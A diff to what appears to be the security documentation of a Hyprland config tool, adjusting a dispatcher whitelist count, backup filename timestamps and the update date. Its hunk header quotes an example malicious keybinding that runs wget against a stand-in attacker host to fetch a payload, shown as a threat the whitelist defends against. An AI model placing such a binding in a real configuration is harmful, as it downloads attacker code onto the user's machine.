@@ -224,7 +224,7 @@ bind = SUPER, K, exec, wget http://attacker.com/payload
 
 **Allowed Dispatchers** (as of October 2025):
 - Verified against official Hyprland documentation
-- Total: 42 whitelisted dispatchers
+- Total: 41 whitelisted dispatchers
 - Examples: `exec`, `workspace`, `killactive`, `togglefloating`
 
 **Maintenance**: Whitelist updated when Hyprland adds new dispatchers.
@@ -299,9 +299,9 @@ fn shannon_entropy(data: &str) -> f64 {
 **Example**:
 ```
 ~/.config/hypr/backups/
-├── hyprland.conf.2025-01-15_14-30-45
-├── hyprland.conf.2025-01-14_09-15-22
-└── hyprland.conf.2025-01-13_18-45-11
+├── hyprland.conf.2025-01-15_143045
+├── hyprland.conf.2025-01-14_091522
+└── hyprland.conf.2025-01-13_184511
 ```
 
 **Retention**: User-configurable (default: keep all backups).
@@ -480,5 +480,5 @@ The author thanks:
 
 ---
 
-**Last Updated**: 2025-01-16
+**Last Updated**: 2025-10-19
 **Version**: 1.0.3
